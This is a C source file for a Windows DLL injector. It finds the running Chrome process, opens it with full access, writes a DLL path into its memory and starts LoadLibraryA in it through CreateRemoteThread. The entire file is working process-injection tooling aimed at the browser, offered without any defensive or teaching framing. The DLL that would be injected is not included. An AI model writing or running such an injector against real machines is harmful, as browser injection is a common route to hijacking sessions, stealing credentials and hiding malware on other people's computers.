#include "stdio.h"
#include "windows.h"
#include "tlhelp32.h"
#include "tchar.h"
#include "wchar.h"
#include "chrome.h"

HANDLE findProcess();
BOOL loadRemoteDLL(HANDLE hProcess);

static const WCHAR *PROCESS_NAME = L"chrome.exe";
static const char *DLL_NAME = ".\\dll.dll";

int wmain()
{

    HANDLE hProcess = findProcess();
    if (hProcess != NULL)
    {
        BOOL injectSuccessful = loadRemoteDLL(hProcess);
        if (injectSuccessful)
        {
            printf("[+] DLL injection successful! \n");
            getchar();
        }
        else
        {
            printf("[---] DLL injection failed. \n");
            getchar();
        }
    }

    return 0;
}

HANDLE findProcess()
{
    HANDLE hProcessSnap;
    HANDLE hProcess;
    PROCESSENTRY32W pe32;

    // Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
        printf("[---] Could not create snapshot.\n");
    }

    // Set the size of the structure before using it.
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    // Retrieve information about the first process, and exit if unsuccessful
    if (!Process32FirstW(hProcessSnap, &pe32))
    {
        printf("[---] Process32First failed.\n");
        CloseHandle(hProcessSnap);
        return FALSE;
    }

    // Now walk the snapshot of processes, and find the process we want to inject into.
    do
    {

        if (wcscmp(pe32.szExeFile, L"chrome.exe") == 0)
        {

            if (is_chrome_process(pe32.th32ProcessID))
            {
                wprintf(
                    L"[+] Chrome Browser PID: %lu\n",
                    pe32.th32ProcessID);

                hProcess = OpenProcess(
                    PROCESS_ALL_ACCESS,
                    FALSE,
                    pe32.th32ProcessID);

                if (hProcess != NULL)
                    return hProcess;
            }
        }

    } while (Process32NextW(hProcessSnap, &pe32));

    wprintf(L"[---] %s has not been loaded into memory, aborting.\n", PROCESS_NAME);
    return NULL;
}

BOOL loadRemoteDLL(HANDLE hProcess)
{
    printf("Enter any key to attempt DLL injection.");
    getchar();

    // Allocate memory for DLL's path name to remote process
    LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(DLL_NAME), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (dllPathAddressInRemoteMemory == NULL)
    {
        printf("[---] VirtualAllocEx unsuccessful.\n");
        getchar();
        return FALSE;
    }

    // Write DLL's path name to remote process
    BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, DLL_NAME, strlen(DLL_NAME), NULL);

    if (!succeededWriting)
    {
        printf("[---] WriteProcessMemory unsuccessful.\n");
        getchar();
        return FALSE;
    }
    else
    {
        // Returns a pointer to the LoadLibrary address. This will be the same on the remote process as in our current process.
        LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
        if (loadLibraryAddress == NULL)
        {
            printf("[---] LoadLibrary not found in process.\n");
            getchar();
            return FALSE;
        }
        else
        {
            HANDLE remoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, 0, NULL);
            if (remoteThread == NULL)
            {
                printf("[---] CreateRemoteThread unsuccessful.\n");
                return FALSE;
            }
        }
    }

    CloseHandle(hProcess);
    return TRUE;
}